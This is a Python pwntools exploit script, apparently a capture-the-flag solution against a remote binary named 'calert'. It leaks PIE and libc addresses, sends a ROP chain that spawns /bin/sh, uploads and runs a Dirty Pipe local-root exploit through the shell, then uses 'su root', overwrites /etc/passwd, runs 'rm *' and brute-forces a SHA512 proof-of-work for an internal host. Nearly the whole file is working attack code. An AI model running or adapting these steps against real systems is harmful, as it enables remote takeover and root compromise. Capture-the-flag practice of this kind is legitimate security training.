from pwn import *
import struct
import os

def swap(i):
    return struct.unpack("<Q", struct.pack(">Q", i))[0]

libc = ELF('./libc.so.6')
elf = ELF('./calert_patched')
# p = process('./calert_patched')
p = remote('61.28.237.86', 31701)

s = b'0123456789ABCDEF'

s1 = 0x3736353433323130
s2 = 0x4645444342413938

p.recv()
p.sendline(b'127')
p.sendline(s*4)

p.recvuntil(b'0'*0x80)

a = int(p.recv(16), 16)
a = swap(a)

pie_base = a ^ s1 - 0x2000
print(hex(pie_base))

a = int(p.recv(16), 16)
a = swap(a)
print(hex(a))

leak = a ^ s2
libc.address = leak - 0x8eebd
print(hex(libc.address))

p.recv()
p.sendline(b'1000')

p.recv()
p.sendline(b'-1')

pop_rdi = pie_base + 0x1703
bin_sh = next(libc.search(b'/bin/sh'))
syscall = libc.address + 0x630d9
pop_rsi_r15 = pie_base + 0x1701
pop_rdx_r12 = libc.address + 0x119241
pop_rax = libc.address + 0x47400

payload = b'a'*0x118
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rdx_r12)
payload += p64(0)
payload += p64(0)
payload += p64(libc.sym.execve + 4)
payload = payload.ljust(2900, b'a')

p.sendline(payload)

p.sendline(b'cd /tmp')
p.sendline(b'echo "start"; while read line; do if [ "$line" = "end" ]; then break; fi; echo -n $line; done > tmp')

payload = b64e(read("./dirty_pipe_poc"))
print(p.recv())
# sleep(0.5)
to_send = payload.encode()
while to_send:
    p.sendline(to_send[:1000])
    to_send = to_send[1000:]
p.send(b"\nend\n")

p.sendline(b"base64 -d tmp > exploit; chmod +x exploit")
print('done')

p.sendline(b'ls -la')
t = p.recvuntil(b'exploit')
if(b'36392' not in t):
    exit(1)

p.sendline(b'./exploit')
p.recvrepeat(0.1)
p.sendline(b'su root')
p.recvrepeat(0.1)
p.sendline(b'piped')
p.sendline(b'cp /tmp/passwd.bak /etc/passwd')
p.sendline(b'rm *')

p.sendline(b'curl http://pow')

p.recvline()
p.recvline()
p.recvline()

sample = p.recvline()[:-1]
print(sample)
question = ''.join([chr(int(i)) for i in sample.split(b'&#')[1:]])
passpharse = question.split('SHA512("')[1].split('" + <user_input>')[0]
print(passpharse)

import hashlib

global x
x = []

def generate(id, length, sample):
    if id == length: x.append(sample.encode())
    else:
        for i in range(10):
            generate(id + 1, length, sample + str(i))

y = b''
for i in range(8):
    x = []
    generate(0, i, '')
    stat = 0

    for j in x:
        ans = passpharse.encode() + j
        h = hashlib.sha512(ans)
        result = h.digest()
        if result[0] == 0 and result[1] == 0 and result[2] == 0:
            y = ans
            stat = 1
            break
    if stat == 1: break

print(y)
# p.sendline(b'curl -d "s="' + y + b'&submit=Submit" -X POST http://pow')

# curl -d "s=889052&submit=Submit" -X POST http://pow

p.interactive()